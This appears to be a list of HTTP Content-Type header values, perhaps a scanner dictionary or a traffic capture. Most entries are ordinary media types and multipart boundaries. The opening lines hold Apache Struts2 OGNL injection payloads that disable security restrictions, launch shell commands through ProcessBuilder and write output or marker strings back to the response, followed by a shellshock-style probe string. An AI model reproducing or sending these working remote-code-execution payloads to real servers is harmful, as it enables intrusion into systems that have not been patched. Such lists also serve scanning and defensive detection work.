%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xuh9ugc2','1')}.multipart/form-data
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(529844289*29848283)).(#ros.flush())}
?(){:;};``',./"<>?|-[]~@$^*%ff\x00\x00\x00\x00\x00\x0a\xff=
Application/x-www-form-urlencoded; charset=UTF-8
EAP
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
application/dns-json
application/dns-message
application/grpc-web+proto
application/html; boundary=------------------------1207a857ebd51e62
application/html; boundary=------------------------1952d6b2f63243d5
application/ipp
application/json
application/json, text/plain, */*
application/json; charset=UTF-8
application/json; charset=utf-8
application/json; charset=utf8
application/json;charset=UTF-8
application/json;charset=utf-8
application/octet-stream
application/octet-stream; charset=utf-8
application/soap+xml; charset=utf-8
application/soap+xml;charset=UTF-8
application/vnd.ms-sync.wbxml
application/x-amf
application/x-www-form-urlencoded
application/x-www-form-urlencoded; Charset=UTF-8
application/x-www-form-urlencoded; charset=UTF-8
application/x-www-form-urlencoded; charset=UTF-8 
application/x-www-form-urlencoded; charset=utf-8
application/x-www-form-urlencoded;charset=UTF-8
application/xml
application/xml; charset=utf-8
gzip, deflate
multipart/form-data; boundary=---------------------------154934846911423734231554128137
multipart/form-data; boundary=---------------------------20873900192357278038549710136
multipart/form-data; boundary=---------------------------24464570528145
multipart/form-data; boundary=---------------------------250033711231076532771336998311
multipart/form-data; boundary=---------------------------350278735926454076983690555601
multipart/form-data; boundary=---------------------------392306610282184777655655237536
multipart/form-data; boundary=---------------------------77916619616724262872902741074
multipart/form-data; boundary=---------------------------7e116d19044c
multipart/form-data; boundary=---------------------------99533888113153068481322586663
multipart/form-data; boundary=--------------------------835846770881083140190633
multipart/form-data; boundary=------------------------22728be7b3104597
multipart/form-data; boundary=------------------------6d7da23fb74b18bd
multipart/form-data; boundary=------------------------98efee55508c5059
multipart/form-data; boundary=------------------------aadc326f7ae3eac3
multipart/form-data; boundary=------------------------ab360007dbae2de8
multipart/form-data; boundary=----WebKitFormBoundary9MZjlIG8fVPjrlCI
multipart/form-data; boundary=----WebKitFormBoundaryAjZMsILtbrBp8VbC
multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv
multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g
multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
multipart/form-data; boundary=1744fc5d26a2c8793df280174e37f73a
multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2
multipart/form-data; boundary=7268695239696237776b593834753335
multipart/form-data; boundary=7a394b58674b414b686153424a433148
multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83
multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458
multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
text/html
text/html,application/x-www-form-urlencoded
text/html; charset=UTF-8
text/html; charset=utf-8
text/plain
text/plain; Charset=UTF-8
text/plain;charset=UTF-8
text/xml
text/xml; Charset=UTF-8
text/xml; charset="utf-8"
text/xml; charset=utf-8
x-application/hessian